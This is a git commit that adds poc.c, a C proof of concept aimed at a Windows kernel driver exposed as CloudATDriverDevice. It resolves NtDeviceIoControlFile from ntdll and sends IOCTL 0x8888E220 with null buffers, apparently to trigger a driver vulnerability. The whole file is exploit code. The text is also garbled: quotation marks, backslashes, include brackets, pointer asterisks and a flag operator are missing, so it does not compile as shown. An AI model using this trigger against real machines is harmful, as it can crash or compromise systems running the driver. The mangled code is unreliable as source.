df81761a0d13c8cc169c0251b080d7d7c5fde66f
y5s5k5 <53048989+y5s5k5@users.noreply.github.com>
2020-12-27 14:20:02 +0800

    Create poc.c

---
+++ poc.c
@@ -0,0 +1,49 @@
+#include windows.h
+#include stdio.h
+#include Psapi.h
+#include profileapi.h
+
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID    Pointer;
+    } DUMMYUNIONNAME;
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK,  PIO_STATUS_BLOCK;
+
+typedef NTSTATUS(NTAPI NtDeviceIoControlFile)(
+    HANDLE           FileHandle,
+    HANDLE           Event,
+    PVOID            ApcRoutine,
+    PVOID            ApcContext,
+    PIO_STATUS_BLOCK IoStatusBlock,
+    ULONG            IoControlCode,
+    PVOID            InputBuffer,
+    ULONG            InputBufferLength,
+    PVOID            OutputBuffer,
+    ULONG            OutputBufferLength
+    );
+PVOID P;
+int main() {
+
+    HANDLE hDriver = CreateFileA(.GLOBALROOTDeviceCloudATDriverDevice, GENERIC_READ  GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    ULONG dw;
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        system(pause);
+        return(-1);
+    }
+
+    LPCWSTR nt = Lntdll;
+    HMODULE hntdll = GetModuleHandle(nt);
+    IO_STATUS_BLOCK p = {};
+    NtDeviceIoControlFile tDeviceIoControl = (NtDeviceIoControlFile)GetProcAddress((HMODULE)hntdll, NtDeviceIoControlFile);
+    if (!tDeviceIoControl) {
+        printf([-] Fail to resolve ZwDeviceIoControlFile(0x%X)n, GetLastError());
+        system(pause);
+    }
+    DWORD lpFakeBuffer;
+
+    tDeviceIoControl(hDriver, 0, 0, 0, &p, 0x8888E220, 0, 0, 0, 0);
+    
+    return 0;
+}
